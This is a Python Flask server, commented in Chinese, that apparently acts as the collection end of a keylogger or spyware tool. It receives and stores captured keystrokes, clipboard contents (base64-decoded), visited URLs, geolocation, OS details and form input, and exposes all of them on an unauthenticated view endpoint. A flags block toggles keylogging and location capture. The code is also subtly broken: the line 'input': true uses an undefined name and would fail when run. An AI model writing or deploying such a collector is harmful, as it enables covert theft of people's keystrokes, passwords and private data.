from flask import Flask, request, jsonify
import os
import json
from datetime import datetime
import base64

app = Flask(__name__)

# 确保日志目录存在
log_dir = './logs'
os.makedirs(log_dir, exist_ok=True)

# 定义日志文件路径
log_files = {
    'URL': os.path.join(log_dir, 'url_log.json'),
    'KEY': os.path.join(log_dir, 'key_log.json'),
    'CLIP': os.path.join(log_dir, 'clip_log.json'),
    'LOC': os.path.join(log_dir, 'loc_log.json'),
    'OSI': os.path.join(log_dir, 'os_info_log.json'),
    'INPUT': os.path.join(log_dir, 'input_info_log.json'),
}

# 初始化日志文件
for log_type, file_path in log_files.items():
    if not os.path.isfile(file_path):
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump([], f, ensure_ascii=False)

# 示例标志位
flags = {
    "geolocation": "true",
    "keylog": "true",
    "urls": "true",
    "input": true,
}

@app.route('/', methods=['POST'])
def log_data():
    try:
        # 手动解析请求体
        data = request.get_data(as_text=True)
        data = json.loads(data)
        log_type = data.get('logtype')

        if log_type in ["URL", "KEY", "CLIP", "LOC", "OSI", "INPUT"]:
            print(f"Received log: {data}")  # 仅调试输出这几类日志

        if log_type == "CLIP":
            # Decode base64 clipboard data
            data['clip'] = base64.b64decode(data['clip']).decode('utf-8')

        if log_type in log_files:
            file_path = log_files[log_type]
            with open(file_path, 'r+', encoding='utf-8') as f:
                logs = json.load(f)
                logs.append(data)
                f.seek(0)
                json.dump(logs, f, ensure_ascii=False, indent=4)
            print(f"Logged data to {file_path}")  # 调试输出
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"error": "Invalid log type"}), 400
    except Exception as e:
        print(f"Error logging data: {e}")  # 调试输出
        return jsonify({"error": str(e)}), 500

@app.route('/view/<logtype>', methods=['GET'])
def view_log(logtype):
    if logtype in log_files:
        file_path = log_files[logtype]
        with open(file_path, 'r', encoding='utf-8') as f:
            logs = json.load(f)
        return jsonify(logs), 200
    else:
        return jsonify({"error": "Invalid log type"}), 400

if __name__ == '__main__':
    app.run(debug=True, port=3000)
